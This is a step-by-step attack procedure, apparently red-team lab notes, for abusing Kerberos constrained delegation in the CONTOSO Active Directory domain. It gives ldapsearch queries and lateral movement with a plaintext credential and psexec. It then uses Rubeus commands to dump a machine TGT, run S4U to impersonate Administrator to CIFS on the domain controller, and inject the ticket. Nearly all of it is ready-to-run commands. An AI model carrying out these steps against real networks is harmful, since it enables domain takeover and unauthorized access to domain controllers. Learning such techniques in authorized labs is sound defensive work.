# Attack

1.  Search for computers whose msDS-AllowedToDelegateTo attribute is not null.

    ```batch
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
    ```
2.  Get the UAC value for _lon-ws-1_ to see if the **TRUSTED\_TO\_AUTH\_FOR\_DELEGATION** flag is set.

    ```batch
    ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
    ```
3. Move laterally to _lon-ws-1_.
   2. make\_token CONTOSO\rsteel Passw0rd!
   3. jump psexec64 lon-ws-1 smb
4.  Dump the TGT for _lon-ws-1_.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
    ```
5.  Perform the S4U abuse to obtain a usable service ticket for _time/lon-dc-1_, substituting the service name for _cifs_.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[TGT] /impersonateuser:Administrator /nowrap
    ```
6.  Inject the ticket into a sacraficial logon session.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]
    ```
7. Impersonate the process.
   1. steal\_token \[PID]
8. Verify the ticket has been injected.
   1. run klist
9. Use the ticket to list the C$ share on _lon-dc-1_.
   1. ls \\\lon-dc-1\c$
